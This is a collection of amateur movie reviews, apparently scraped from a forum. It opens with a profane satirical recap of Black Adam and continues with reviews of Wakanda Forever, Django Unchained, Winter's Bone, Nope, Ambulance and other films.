A long-ass time ago on Tatooine, an evil king enslaved the Kahndaqians of color, forcing them to dig all over *Raiders of the Lost Ark* sets for eternium, the magical crystal or metal or whatever that makes the Kahndashians special. Some old dude who fell in plaster finds a chunk of adamantium, and is about to get bum-rushed by extras from all the racist parts of *The 300,* when a kid shows up to save him, and everyone listens, because he’s got the least amount of bird shit on him. 

So the old dude and the kid bring the vibranium to Guard Who Will Obviously Kill You and Take Your Shit, who obviously kills the old dude and takes his shit. So the kid tells a nearby rando they all need to rise up and ban the Confederate flag, but the rando is all, “Nah,” so the kid steals back the chunk of unobtainium, and runs to the top of a mountain, where everyone below in District 11 can see him make heart hands.

So, the kid’s about to be executed, and he’s still making heart hands with the crowd, who are all-in for some reason, but the executioner’s blade hits nothing but Nightcrawler smoke, because the kid BAMFs outta there, and ends up in the Chamber of Secrets with the five wizards, where Black Gandalf and crew give him SHAZAM powers and turn him Samoan, but who cares, he gets to be Dwayne Johnson. So the evil king is just being handed the Infinity Gauntlet, but Dwayne Johnson shows up and drops The People’s Elbow on the royal palace, and shit blows up and everyone takes a nap. 

5,000 years later, the Kahndashians all live in Wakanda now, and it’s still being oppressed by wypipo. A clearly not-sketchy dude is driving with his two clearly not-sketchy friends in the HVAC Mystery Machine, when they get stopped at an arbitrary checkpoint. Just when the tension they didn’t bother building is about to break, a (different) kid shows up to remind everyone this is the DC universe. Mad that he’s not making Marvel money, the guard gives the kid five across the eyes, and the HVAC Mystery Machine takes off. By the time the guard turns around, it’s almost 20 feet away, waaay out of range of pursuit or radios or descriptions or plates or roadblocks. 

Anyway, so it turns out the not-sketchy dudes are harboring a hot woman, who just so happens to have necklace made of unrefined amazonium, so they drive from Wakanda to northern California, and enter Mt Doom, where the One Ring is hanging out, ready to turn someone evil. And wouldn’t you know it, one of the sketchy dudes is evil, and he brings all his evil friends, who shoot up the place, until hot woman claps vigorously and fervently believes, and Tinkerbell comes back to life. 

Then Zack Snyder comes and guest-directs his favorite thing: ripping off a Marvel movie, as Dwayne Johnson does a hilarious parody of that time Quicksilver saved everyone, only Dwayne murders everyone horribly instead. Unfortunately, one of the canon fodder (yes, I did it on purpose) manages to launch a kryptonite rocket, injuring Dwayne Johnson, and so hot woman and her brother have to hide him, down at the end of Jabroni Street, at the Smackdown Hotel. 

But fuck that, we have a Suicide Squad to do, so here comes Viola Davis to introduce T’Challa’s sister, who’s got wind power I guess, and she’s being buzzed into Xavier’s School for Mutants, where she’ll meet up with Black Hawk Down, the World’s Most Interesting Man, and the Fonz’s nephew Ayyy Rothstien, who has the power to be the subject of 1,000 antisemitic conspiracy theories. They all hop on the Blackbird, and fly off to capture the Most Electrifying Man in all of DC Entertainment. 

So The Rock wakes up and shoots a poster of the Witcher in the face with lightning, and Kid DC Product Placement attacks him with comic relief, but before Flex Kavana can chokeslam him, he sees himself in the mirror, and realizes he looks 5,000 years older than he did in The Scorpion King, and not just a little puffier. So he smashes through a wall and uses his AC/DC powers to blow up their video, then gives the DC knockoff version of Conan’s “crush your enemies” speech. Hot woman, who is Kid DC’s mom because of course she’s a single mother, isn’t having it. 

Neither is Rocky Maivia, so he bails, and Kid DC follows him, traveling a combined 4 feet on a skateboard between taking stairs, because that’s how the hep kids swing these days, you dig, daddy-o? Next, the Suicide Squad flies into Wakanda to banter some exposition, while Dwayne Johnson checks out the massive falling rock hazard they left up to commemorate that one time he blew shit up, and Kid DC gets chased by Captain Wypipo, until his mom and ROCKZAM intervenes, and ROCKZAM straight murders a bunch of dudes right in front of the kid, because John Connor hasn’t taught him why you don’t kill yet. Kid DC hearts this. 

The DCX-Men and Dwayne Johnson get into a big CGI fight, and he and where-did-he-get-those-powers Hawkman duke it out, and Goldmember chunks magic deuces, but then they signal Cyclone that it’s her turn, paying off the absolutely nothing they’d set up. She crimps her hair and demolishes a building, Kid DC nearly dies, but Magic James Bond saves him, then has a vision of some dementors and the Crown of Spock’s Brother. Then Zack Snyder steps back in to rip off the Thanos/Dr Strange fight, and Ant-Man finally shows up to the airport scene, but then Dwayne Johnson gives Ant-Man a game-ending concussion, and he’s listed as questionable on the injury report. The Rock is the people’s champion. Literally, the people call him their champion. 

It’s obvious Black Adam can whoop the Justice League of Society Avengers, but the movie isn’t over, so he flies off so Hawkman can have hilarious banter with MILF lady about oppression and military occupation and ancient history and whether it’s still the White Savior trope if he’s Black, in a walk-and-talk as cars in the background circle the Statue of Fisting. They go to the temple ruins, where Dwayne Johnson is brooding, and we get his real back story, which is that when he was given godlike powers, he didn’t handle it so great, so Wizard George Clinton and friends imprisoned him. 

In the meantime, Call Me Ishmael, the evil dude from way before, shows up at hot mom’s apartment, where her brother greets Kid Plot Device, who narrowly escapes, but not before the wacky uncle gets shot in a probably nonfatal way, and the kid escapes through a human-sized good guy hole that bad guys can’t go through.

The Just Us Society and Dwayne Johnson have a scene from probably one of the Fast and Furious movies, because it’s terrible and immediately devolves into hostile dick-measuring. Luckily, a woman is there to stop that toxic masculinity by once again defending the mass murderer against the law-abiding superheroes. She’s interrupted by her kid, however (the most realistic thing in the entire movie), because Email brought All the Guys Dwayne Johnson Hasn’t Killed Yet to search for the kid, and hot mom pleads with Black Adam to save her son, because she knows he’s not a monster from all the horrible ways he’s murdered people right in front of her.

The kid manages to simultaneously do the worst parkour and the worst skateboarding you’ve ever seen, evading the bad guys who have been ordered not to kill the kid unless it sets up a joke for Dwayne Johnson, who murders a lot of people again, but Ish-male gets on his Thing That Flew Out Of The Sky Hole In The Avengers Movie and flies away. Rather than use the 3-dimensional space available to him, The Rock weaves around buildings in pursuit, which is stupid but more visually interesting. The People’s Champion rains massive chunks of debris onto the people he’s liberating, and flings at them glowy-powered bikes with unknown-but-likely-devastating potential to explode. The Justice League B-Team shows up again to literally point out Black Adam is a violent psychopath, but fuck that noise, get back to being comic relief, you party poopers. The chase ends with a fake-out that only fools people who don’t understand simple physics or elementary biology, so about 89% of the viewing audience. 

The (good guys? doesn’t matter) find out where the kid is, but first have to have a pointless fight about literally nothing, so they can accidentally discover the Crown of Sauron, and forget that the kid is still kidnapped while they do more exposition in the Quinjet of Convenience. Anyway, they finally get around to a rescue attempt, after Dwayne Johnson kills a bunch more people, and they have the inexplicably stupid showdown where nobody does anything a person would do. Mehmael says and does generic evil things, and Black Adam does his exploding lightning thing again, then runs off to brood because the world’s most predictable thing happened. 

After all that punching each other forms a strong male bond, Hawkman and Black Adam have a heart-to-heart, where Dwayne Johnson reveals that psyche! Rue dies. What? Don’t think about it. Anyway, Dwayne Johnson reverse-Captain-Americas himself, entering the uncanny valley with his head on a ten year-old’s body. So they fly him to the “Task Force X Black Site (Secret Location)”, which you’ve never heard of, but shut up and check out the X-Men plane! It does a Star Trek: The Next Generation! They dump The Artist Formerly Known As SHAZAM off on blonde Trinity, and head out into the foreboding land of There’s Still 35 Minutes Left In This Movie.

So, the obvious thing happens, and Ishmael gets his crown powers, and rises from the sea? maybe? and Hawkman says his plane’s “readout says it’s a demon. Sabbac,” and everyone with half a brain says, “LOL What? How?” But who cares, the demon king rips the saucer section off the quinjet and hurls it at the city, and a whole lot of innocent civilians definitely die. So the heroes try everything. They throw Discount Dr Strange powers at the demon king. They LGBTQ+ airbend at him. They hit him with city property and Hawkman’s spiky disco ball on a stick. Hawkman even activates infrared against a foe who primarily uses fire, because smart. Nothing works. 

Then Dr Pierce Bond does the sacrifice play to save Hawkman, and gives him a speech that makes you reevaluate their relationship and their sexuality, finally making them interesting. Dr Fate (was that his name this whole time?) gives another speech while trying to free Dwayne Johnson’s head + Chris Rock’s body from his endless nightmare are-you-kidding-me prison, and Zac Snyder returns to direct a slo-mo ripoff of the Rodney King beating. Dr Fate’s speech gets reeeally racist-adjacent, but just when you’re creeped out by all the “we don’t need a white knight; we need something darker” talk, Chris Rock’s body kicks some Guantanamo guard ass, and escapes. 

Then Sybok shoots up an oh-come-on fucking sky beam, because there weren’t enough Marvel rip-offs yet, and the extremely unthreatening sixteen or seventeen hell-soldiers show up, and Dwayne Johnson says SHAZAM, and suddenly, Saddoc’s half the man he used to be, and all is forgiven. Don’t worry about the hundreds of people you murdered, Rock! Black Adam’s darkness makes him better than Hawkman’s-- Ohhhhh, that’s why they had to make Hawkman Black. Okay, I get it, now. 

Anyway, for all his murdering, they offer Dwayne Johnson the Throne of Gondor, but he’s like, “Nah,” and The End. What about Task Force X? Won’t they be upset one of their prisoners escaped and killed (or at least beat up) a whole bunch of dudes? Whatever happened to the line between heroes and murderers? #justiceforsamir? Never mind! It’s motherfuckin’ SUPES, ya’ll!! In another Marvel rip off, the mid-credits sequel teaser! Enola Holmes’ brother is here to talk! Bam! Credits! The for-really-reals End!

1668694477.0,Hi guys. This is going to be my review for Black Adam.,"I gotta say this movie was must better than I thought it would be . Dwyane Johnson gave a great performance as Teth-Adam/Black Adam. Usually I feel he is mostly playing himself but I don't know why I really enjoyed his performance in this movie. This movie is pretty brutal for a Pg-13 movie. I mean I had so many gasps and wtf moments throughout the runtime of this movie.After watching this movie I feel there should actually be a new age rating . Maybe it is just me .The slow-motion is well utilised and not overused like Zack Snyder's Movies. The action sequences were badass.The humour was also great . Noah Centineo was also great as Atom Smasher. Extremely funny. Can't wait to see more of him. Aldis Hodge was also great as Hawkman. I really liked how atleast he was against Black Adam's decisions once in a while. Instead of just blindly following the orders. I really enjoyed everytime Quintessa's Cyclone used her powers and it was perfect with the slow-motion .It was good to see Djimon Hounsou back as Shazam. I don't know why but I thought we will directly see him in Shazam The Fury of the Gods.  I still don't get the unnecessary hate against this movie. But the person who actually stole the show is Pierce Brosnan as Dr Fate. His character was so charismatic and interesting.I really hope Pierce Brosnan gets his own movie as Dr. Fate in the near future.  Even though this is a 2hr 4 min long movie it still didn't feel that it was short .Another great thing about this movie was obiviously the post-credit scene. It is great to have Henry Cavill back as Superman and not in the form of faceless cameo appearance as in Shazam and Peacemaker . Now for the criticism, I don't get why would Superman and the Justice Society of America would anything on the command of Amanda Waller. Second issue , why is Jennifer Holland's Emilia Harcourt so much like Amanda Waller out of nowhere ? That too without any explanation. Overall I had a great time watching it. 4/5 from my side.

1668659818.0,Black Panther: Wakanda Forever Review,"NON-SPOILER

 Although the movie has a long run time that seems to only be felt during the epilogue of the movie after the climactic end fight scene but that speaks for itself in all honesty. The movie handles the sudden passing of Chadwick Boseman with a very touching in universe moment and send off of the character that was absolutely missed from this sequel, that being said the cast of characters that would otherwise be supporting members stepped up to the plate to deliver in my opinion one of the best MCU movies since Spider- Man No way Home, Maybe even the best of phase 4 all together, with the introduction of Namor and the retcon of his origin to no longer use the derivative Atlantis as the comic book origin does seemed to work in the movies favor as it was good to have The underwater city of ""Talocan"" and the hidden city of ""Wakanda"" be parallels in the sense of mass and kingdoms and political issues. Overall, the plot is very tight and with all the twists and turns of who shows up and the inevitable demise of certain unsaid characters the movie goes by like one of your favorite rollercoaster rides from your childhood, Make sure to go see Black Panther: Wakanda Forever In theatres now - Ryan ""Superbad"" Sharp 8/10",moviereviews,1239,224,14,0

1668383550.0,Django unchained: my thoughts,"(Yes, movie is more than 10 years old, but I wanted to share my thoughts)  

(Spoilers)

Django unchained – another movie created by Tarantino, a famous filmmaker. Some people call him a genius, although this exact movie does not look like a work of a genius at all, rather vice versa.

To begin with, what do people love Tarantino for?

Dialogs. (Actually not only because of them, but let\`s start with them)

In the most successful Tarantino\`s movies dialogs don\`t have to do anything with the plot at all. Topics can be absolutely not related to events that will take place in the future or are going right know. However they are interesting to look after and they develop the characters. 

But what about the dialogs in the Django unchained? They are not like this at all. They have strict function related to the plot, they are boring (especially at the first half of the film), and they do not develop characters as successfully as in other Tarantino\`s movies.

I am talking about Django – main character. He took the most screen time but remained the less developed character. He looks empty, everything that we know about him – he has a wife, he wants to rescue her, and he somehow becomes the 0.01% person with unique skills, charisma and mindset that give him opportunity to win. 

That\`s also looked stupid for me: why the hell did Django somehow became so powerful? Why did Dr. Shultz took him as a partner, why at all he does what he does, and finally – why the hell some random man manages to kill dozens of well trained people without any problem. Everything of these is very illogical and that irritates me during the whole process of watching. I do understand why everything listed above is in the film. It is because of the second thing Tarantino\`s movies are known for.

Atmosphere.

Usual movies follow usual patterns and as a result viewer gets used to these pattern. That\`s where Tarantino\`s movies, as well as Django unchained, surprise us. Pacing is unpredictable:  throughout the film a lot of risky actions are taken, making the situation more and more stressful for a viewer. We know that something is going to happen, but we know neither what exactly, nor when. And then explosion – the situation goes out of control. And then another one, and again, and again. And when you think that\`s the end, story surprises you with another twist. That\`s what makes story interesting.

Such pacing could be built thanks to the plot: mindgames of Dr Shultz, who is trying to accomplish his goals using disguise and deception. He and Django go deeper and deeper into enemy territory, leaving the way back farther and farther. These mindgames are more interesting, than just fights. Moreover they perform a function of character development even better than dialogs (talking rather about Dr. Shultz). However this pacing is only in the second half of the film, first is still boring.

That\`s the main things I had in my mind. I have to admit that I was comparing it to other Tarantino\`s movies and had to high expectations. 

In the end, plot, pacing atmosphere is not to bad, but to much drama, to illogical, first half of movie is boring. Didn\`t like it, but think that someone will enjoy it. 4/10",moviereviews,3226,562,75,0
1668348974.0,Winter's Bone (2010),"(yes, I know the movie is 12 years old, but I really want to give it a bunch of well-deserved stars)

(spoilers below)


**Atmosphere**


This move feels stale, calm, kind of grey – this is not a movie you feel like watching twice, but that’s exactly it’s aim. The characters don’t have a pleasant life, they have to do all sorts of things to simply get by, especially in Winter. The location of both the book and the film are certainly not by accident – this is rural Missouri, right in the middle between the Midwest and the South – aka what tourists know as “fly-over” country. In a way, the movie awakens a certain compassion for it’s worn-down and tired characters. This is the America most movie productions don’t show and don’t tell, one section of the abandoned poor. It’s not a blooming city with good and bad parts or a suburb, it’s the few huts you briefly drive by after 200 km, followed by 200 more. The characters are isolated, but they are so together, which causes a variety of good and bad situations. 


**Jennifer Lawrence' performance**

Let’s address the academy award winner in the room 😊 Jennifer Lawrence, in this movie, technically auditions as Katniss Everdeen for 1:40 hrs. There are countless parallels between Katniss and Ree – in fact, they nearly have the same life. Forced to become the family head at a young age due to a mentally ill mother and an absent father, a stoic provider and yet loving older sibling – both have to function as a single parent, and it shows. They have learned to hide their emotions and own needs for their families’ sake, and have become kind of emotionless due to circumstance. Yet there are moments when their feelings bubble up or are let out, and it works. This is a character who is burdened and working hard at all times.


**Life in rural America**


The situation of the characters onscreen, as mentioned above, awakens a compassion for them (also through their on-point and very authentic performances on all sides, five stars). They live off nature, their farms, the few available jobs and, in addition, by producing and selling drugs, a problem which has reportedly skyrocketed in rural America. They are used to violence and things being tough. Sometimes by bigger, sometimes by smaller situations like Ree’s siblings sleeping on a couch and armchair in what seems to be their houses’ single room aside from the bathroom. We eventually come across a situation where Ree has, despite warning, publicly tried to speak to the local drug cartel leader – he can’t let that stand in his area, but Ree had no choice but to do what she did – which leads to a really great scene where she does nothing else but tell the truth: all she’s asking for is help. She wouldn’t do anything she does if it wasn’t to save herself and her family from homelessness and unemployment. She tries to join the army shortly after, which also crushes on her having “the wrong reasons” – which made me wonder what the right ones would be. How many americans join the military for other reasons that to support themselves and/or their family in a country that makes it incredibly hard to land another well-paying job, especially for the younger generation? And isn’t it not that hard to miss that keeping the poor poor is precisely how this country makes so much of his army? The amounts of money spend on the country’s forces surely speak for themselves. 


**Broken surrounds**


The movie has a nearly post-apocalyptic style to it. If you told me it took place after the world was wrecked by a massive war, and with the militairy and police ordered to keep things in order and drug markets booming, I wouldn’t argue. As mentioned above, the people in this story live off nature and their farms, in buildings that often look like they are falling apart – this is accompanied by shots of props like old couches outside, old toys, piles of wood and metal – the characters seem to live on oldmetal depots. Nicer houses or the well-kempt police officer who shows up frequently look out of place, so different from the survivors of the woods they speak to. This feeling off a world that is still recovering from war and destruction is accompanied by the character’s second-hand, cheap-looking and often damaged clothing. We have all seen and maybe even worn such at some point, but they have a different feeling in this surround. 


**Feminism**


Another thing is in this room – this movie once was said to show feminism in a non-feminist world, and while the origin of this quote is difficult, I can certainly see it. The women in this story are portrayed very authentic and often stand technically below men, but they find ways to get around the patriarchy and help each other – or make sure that no man, only them, lies a hand on a woman they beat up. It’s not a great example, but a power dynamic is there. Also – the women we see are workers. They have chores left and right, and they get them done. The ending is pretty interesting, as you know that the Wilton women help Ree to make sure she doesn’t do any damage in the future. And they need no men for that. 


**Ree's siblings**


Ree’s interactions with her siblings are interesting – she coddles her little sister a lot more than her brother, maybe because she’s seeing her younger and less damaged self in her, and maybe for societal ideas – or his own wishes, which she respects? We don’t know. Meanwhile, chances are also she is - out of desperate necessity - preparing him to soon become her second-in-command in the house as soon as he reaches teen hood by treating him more like an adult, until her sister is old enough too. The future isn’t too bad once they’re all adults, but right now, Ree has to stem everything alone. 


So, all in all, probably one of the most authentic and no-nonsense movies from the US that I know, and I think what we see could also happen in other parts of the world where people have to get by and support their families in small rural communities

1668314873.0,Wakanda Forever Review Thoughts,"First off, tribute to Chadwick was great I teared up a few times, other than that the movie left me empty. Now I'm no creative writer but personally the entire premise (the scientist) of the clash between wakanda and namor was pretty weak. Also why would a scientist build equipment for someone to find vibranium if it can be weaponized not smart at all from a ""genius"".

After a while you even forget wth they're going to war about. It seemed like they were all super human with vibranium weapons and it isn't very believable Shuri would defeat Namor at all. So nice of Namor to wait until BP is back before attacking Wakanda again.

The plot is all over the place and very weak overall. They shouldn't have made it at all and should have recasted T'challa or wait. The writers really screwed this up, I don't know how anyone in Marvel saw this and thought it was great. BP2 goes to the bottom of my list as far as Marvel movies goes.

1668298174.0,Black Panther: Wakanda Forever Review,"

The movie was ok with its plot about Shuri trying to cope with the lost of her family. But the main gripe I have about this movie is that they in a sense they talked about so much without saying a word. 

The jokes they were doing clashed with the overall tone of the movie. 

Nothing really happened and one plot hole that bugged me was in a scene where someone somehow bugged a bracelet that was way more advanced than any tech they had. 

Most parts of the movie were just talking and action that ended prematurely.

 Weird white people colonizer jokes.

 Namor not understanding that there are people much more powerful than Black Panther. (Spider-Man, Dr. Strange, She-Hulk, Hulk, Captian Marvel, and Thor) weird how he never got the memo about the Avengers in general if he hates the surface world so much. You'd think he would keep tabs up on top if he wanted to destroy it effectively. 

Riri while not as annoying as she was in the comics she was still kind of annoying not to mention she killed at least 6 people by crashing the drone into them, she must be a great hero. Namor was underutilized massively by making him an villain. 

No clear hero of the story until the last 40 minutes of the movie. 

The CIA agent plot point was completely useless. 

MCU fanboys will defend it to the end but one of the lower tier marvel movies by far. 4/10",moviereviews,1356,249,22,0

1668149691.0,My Black Panther: Wakanda Forever Review,"I have seen Wakanda Forever, and I am sorry to say I do not think it met my expectations as an MCU fan and as a devout marvel comics reader. Like many of you I witnessed the first Black Panther movie and was exhilarated by the mesmerizing story and visually stunning cinematography. Truly a work of art that will be talked about for many years to come. Then 2020 came and took our king Chadwick Boseman from us. Again like many of you I was saddened by his passing. Two years passed and they released Black Panther Wakanda Forever, a badass tribute to the king of Wakanda, and a great way to introduce Namor, the Submariner(Imperius Rex!!). Also it passed the Panther suit on to another person and we got our new Iron man in the form of Ironheart aka RiRi Williams, who I have no doubt will blow our socks off. All of these listed things and so much more make this movie worth watching but I couldn’t help but feel disenchanted walking out of the theater. Is the MCU in a decline? This movie, this tribute to Mr. Boseman’s memory was the end of phase four, which save for a few movies and a few of its included Disney plus shows, has been a bit anticlimactic, and feels hopeless, so much so I have started to think of phase four as the MCU equivalent to Europe’s Dark ages. Being the end of phase four I thought the time for some hope and build up would’ve been in store and there would be light at the end of the dark tunnel, with the introduction of two new characters and the passing of the Black Panther mantle. But all the movie made me feel was sad and thinking of my own losses. Not a feeling I have felt since Peter lost Gwen in the clock tower in The Amazing Spider-Man. The Wakanda Forever movie was not a hope inspiring movie that promised upcoming action. There wasn’t even a tease post credit scene that keeps us true MCU fans glued to our seats long after the credits start rolling. All in all however, I think Chadwick would be pleased with how the MCU honored him. I only hope that the MCUs next phase will live up to fans expectations.

Please let me know your own personal thoughts, and remember, this is my own personal opinion and in the grand scheme of things means little",moviereviews,2193,413,34,0

1668036956.0,Barbarian (2022),"In a movie that blends thriller, horror, and comedy you’ll find that what appears good is likely evil and what appears evil is likely just misunderstood. Sin and salvation run amok in this visceral tale of a girl who just wants to get a new job. 

Barbarian takes very modern and real fears and weaves them together across a few very unlucky character plot lines . As a woman, having your airbnb double-booked with a strange man in a very unwelcoming neighborhood and staying the night there is far from ideal. In fact the whole time you want to yell at her to get out while she can. But of course you don’t because you don’t want to disturb the rest of the people in the theater with you (that and she probably wouldn’t hear you). As a man, having accusations of sexual assault and the ensuing ramifications to your career and reputation are real worries in this “me too” day and age as well. 

Confronted with these fears, Barbarian pits these characters in a gruesome cringe-worthy can’t-look-away fight for their lives in which horror and humor keep the audience engaged and wanting more. Dive down into the darkness with them if you dare. The longer you last, the more you’ll unravel. But be careful, the truth is never an easy pill to swallow.

1667523042.0,Candyman (Blog Post),"[Candyman \(2021\) Promotional Poster](

Well before my course on black horror films at UCLA, I went and saw *Candyman* the weekend it premiered in theaters. I, like many others, was a fan of Jordan Peele’s work. Once I knew he was behind the film and contributed to its creation, I made sure I took the time to see it. I remember how I felt during and even after watching *Candyman*. I remember being entertained throughout the film and discussing it in great detail with a friend I took to watch the film with me. We discussed our favorite moments of the film, that included the parts that scared us the most, the moments we felt the most suspense, and even what characters made us laugh. For me specifically, it was Nathan’s personality that added a comedic relief in just the right moments. 

One very important aspect about the film that I did not discuss the first time I watched it was how it reclaimed the cinematic experience people of color felt and witnessed when the first film was released. Before taking this course at UCLA, I had never watched nor even knew the original 1992 *Candyman* film existed. When I finally watched the original film, it was clear as day that the remake reclaimed so many moments of trauma for people of color.

The original 1992 film, in my opinion, often portrayed people of color in a negative manner. For starters, the Candyman character himself was tortured and lynched because he fell in love with a white woman. Throughout the film, we see this character who was so wrongfully abused somehow become the predator and monster who spends the film tormenting a white woman. This is a narrative and theme that was all too familiar throughout the history of Hollywood. That is why the 2021 remake or technical sequel of the film was more than just entertainment. The *Candyman* that Peele was behind was a film of empowerment.

The ability to produce an entertaining horror film that is able to scare and shock your audience is already a difficult job, but being able to do so while correcting problematic tropes into roles that seek to empower and not discriminate, is an entirely different job. Yet, it is a job that Jordan Peele and Nia DeCosta did very well with *Candyman*. They focused on giving their audience the horror they wanted but crafted each scene with careful consideration. Traumatic and brutal killing moments that involved people of color are hardly witnessed in this film. Peele and DeCosta played instead on the psychological terror to have people feel fear while still being entertained. The narrative of a black man chasing after a white woman was eviscerated and challenged with the narrative of racial reclamation and healing.",moviereviews,2692,464,39,0

Still heading into the movie with an optimistic mindset, I finally got to see the movie yesterday, two weeks after it's release. Now having seen the movie, I can say that while I understand and mainly agree with the criticism it's received, the film still manages to provide a good time for any comic book/superhero enjoyer. Black Adam is DC's newest superhero film starring Dwayne Johnson as the titular character, Aldis Hodge as Hawkman, Pierce Brosnan as Doctor Fate, Noah Centineo as Atom Smasher, and Quintessa Swindell as Cyclone. Although the movie certainly has its fair share of flaws and downsides, I think audiences will be pleased with the fantastic score, thrilling action, the introduction of the Justice Society, and the way this movie teases things to come. In fact, I'd probably overall describe Black Adam as a good ol' popcorn flick that'll do the trick in satisfying your superhero craving.""

1667364288.0,The Thing (1982) - Miniview,"""While *The Thing* is categorized as a science fiction horror film, the story itself isn't so much scary as it is suspenseful. Set entirely at a research facility in the Antarctica, I personally felt this was a great choice of setting because it really added to the fear level. That sinking feeling of complete isolation really settles in when you realize these men are entirely left to their own devices...in the middle of nowhere. And really, who realistically is going to come to their aid out here? The barren and freezing environment of the Antarctica definitely helped to elevate the story by upping the stakes and adding to the building ominous atmosphere.

But while the story itself isn't necessarily ""scary"", the horror element of *The Thing* comes from the incredibly graphic visuals of the disgusting monster and the gruesome deaths it accomplishes. Look, I'll be honest here, I saw maybe a sliver of what The Thing actually looked like and then I tapped out real quick. It was so so terrifying and gross to look at, and hearing the sounds of ripping bones and body parts was not something I wanted to see. So while I can't comment in extreme detail as to what the monster looked like, I will say that I deeply admire Carpenter's use of practice effects to his advantage. With many films nowadays (not just in the horror genre) implementing CGI on a frequent basis, it was refreshing to see a film that relied mostly on its practical props and effects. There was an intensely realistic look to everything that set the scary style and feel of the movie. And by the look of all my friends' faces as they saw the Thing appear on screen, all I can say is these practical effects did their jobs well.""

1667346208.0,Nope (Brief film commentary),"The existence of Nope as a film stems from Jordan Peele’s creative ability to intertwine historical moments with vivid imaginations filled with a captivating story-telling power. The film introduces the audience to a clip of a black jockey riding a horse; an actual piece of cinematic history. The family the film is focused on, however, is fictional. The family Peele created is supposed to be descendants from said jockey. This play on unrecognized historical figures is something Peele has done before. In *Get Out*, Peele also created a fictional family that was said to be the descendants of the athlete beat out by olympian, Jesse Owens. This ability to inject a fictional family into real historical moments is quite genius but it is not done in vein. Peele carefully chooses these historical moments for a reason; and *Nope* was not an exception.

Similar to the historical clip, a great amount of the film captures an African American man on a horse. A simple description, but yet something so rarely done in cinematic history. Films that introduced mass-loving and addictive genres in Hollywood like Westerns and Science Fiction often left out African Americans from holding little if any representation within them. Therefore, it is no surprise that Peele decides to give this Science Fiction horror film a western look. Peele continues to tell incredibly entertaining stories in a format that tributes and tries to correct the unsettled grievances people of color experienced throughout Hollywood’s history. The ability to do such a thing is not an easy task but Peele manages to successfully do so and yet decides not to stop there. Peele’s stories are not only entertaining, but they are riddled with messages and meanings that conjure debate and thought well after the film’s credits begin to role.

One of the main messages I believe Peele was trying to relay to his audience was mankind’s dangerous and over-reaching habit of exploiting nature. One of the characters the film focuses on is Jupe, an ex child-actor that survived a brutal and traumatic filming event that involved a chimpanzee killing several individuals on set. Similar to that animal, the film’s subject of “evil” is also a living and breathing creature or animal of some sort. The aggravation this animal exudes as it terrorizes people stems from Jupe trying to contain it. Throughout history, and specifically for purposes of profit and entertainment, humans have tried to tame wild animals. Often, these animals fight back or revolt unexpectedly. The film creates a vivid imagery of the dangers we place ourselves in when we overstep these boundaries with nature. Peele makes sure to provide that balance as well, showing us how OJ treats nature with respect and boundaries. In the end, it is that very respect of boundaries that keeps certain characters alive.",moviereviews,2848,467,41,0
1667168112.0,"My review of the 1958 film, Vertigo","A movie that combines many genres from possession to obsession, thriller, horror, and sometimes just some good old-fashioned gaslighting.

This movie feels like two different movies.  The first half feels very supernatural.  It shows a woman being possessed by a woman from the past.  About half way through there is a plot twist that changes the direction of the story entirely.  Somewhere in this transition the movie started to lose me.

While I think the movie is really well crafted and has a legitimately good twist I think the twist is where this movie (only momentarily) falters.  The twist is interesting but it’s not really explained all that well until the very end by which point you see all the results.

San Francisco is the perfect setting for this film.  The way they show driving shots and how it looks like the characters as well as the audience are drifting through a maze of chaos and confusion. It works really well to create a uneasy atmosphere.

Jimmy Stewart gives a career best performance here.  His character goes through a collection of emotions from defeated and rejected, to obsessive, all the way to manic.  He does a great job with all parts.

Kim Novak gives a great performance of as Madeleine/Carlotta.  Her performance is what sells Stewart’s.  She had to become someone he would become obsessed with and she does the job well.

This is a really good movie that has a great twist.  I know everyone loves this movie and consider it one of the Hitchcock’s best but I feel a little misled and like the twist only partially lost me, still making this a great film.

The big production is full of vivid detail, humanity and  expresses the horror of war in a whole new light and on quite a new  level of story-telling and compelling craftsmanship.  
A very important  part of history to learn from in order to see the world in its  complexity and messiness and to learn to appreciate peace and its  absolute central importance and preciousness. I didn't expect the movie  to be that good and important, regardless of the book's original  incredible depth (the first movie version which followed the book's  release won an academy award). And yet still they managed to top it off  and to take it up to a whole new level. I am extremely impressed.  
The  visuals (particularly the setting and costumes) and the music, but also  the \*way\* the story is told are beyond belief. A modern retelling  indeed, focusing on important aspects of the original book, getting to  its core and essence, and leaving out all the rest. I was expecting just  a remake and got a whole new perspective on war and how to tell the  story of its suffering (and there are many war movies out there).

The  famous phrase claiming that all war movies glorify war ends with this  movie. This is the first one I see which makes it impossible to like  even one single aspect of it. And that is why it is such an important  piece of genius. Gruesome in the most realistic of ways. War is anything  but beautiful.

1650875913.0,Ambulance is the Worst Movie Ever...,"Ambulance is the worst movie I have ever watched in my life and I stuck it out for 138 minutes I will never get back... if you want an in depth breakdown of how bizarrely weirdly awful it is... Here we go...
So. Will and Danny are brothers. But one's white and one's black so that's cool and ok cause that's society and this movie thinks it's all about representing society. But it's not. 
To note: this is a Michael Bay film... movie is probably a better noun, but not by much. Anyway, Will's wife has cancer and the insurance won't cover anything. He's ex-military for plot purposes. Initiate heist mode: 32 million ot something in a heist that of course goes wrong and results in our semi-sympathetic anti-heros commandeering an Ambulance with a wounded cop in it. Up till now characters seemed somewhat motivated by their backstories. It just gets dumber than paint after this.
The Ambulance is on the run!!
99% of the LAPD is on their tail! But a cop is wounded in the Ambulance... At this point an EMT literally performs some weird surgery in the back of the Ambulance during which: his spleen bursts; they clamp an artery with a hair clip; and he wakes up only to be knocked out with a one-punch from Will. Seriously. This all happens at like 60 miles an hour. Why are Danny and Will trying so hard to save a cop in the Ambulance while simultaneously risking the deaths of multiple civilians and directly shooting at cops to the point where they arm that chollo-mobile with a fucking mini gun and subsequently shoot Captain Monroe. Also throwing their weird hired Latin gangsters fully under the bus as they flee in the multiple Ambulances. This is probably the stupidest movie I've seen since ever. You know what a spray painted green Ambulance looks like? Yah. They set it up so 5 Ambulances flee from under a bridge... Anyway it looks like a fucking Ambulance. But it's green. 
Then they murder a bunch of Gang bangers and the EMT lady shoots Will in the shoulder cause yeah... we need another excuse for Ambulance-magic. Also: they are still driving the green Ambulance. And now we need like 18 SWAT snipers all aiming at the Ambulance cause Danny is being shitty. (Why didn't they just jump in a stolen Toyota Camry at the Ambulance switch?? Who fucking knows. Nothing makes sense in life anymore.) Negotiations have failed! But Will pokes his dumbass head outside the tank that is the Ambulance... and he gets shot. Again. By the police, because of course. Some dramatic music plays now.
Oh! And now Will's wife has just broken through a police line by pushing a  SWAT officer aside (they're cool with that) and she just demands of him to ""hold on."" He holds on. But then he just fucking dies. Like a loser.
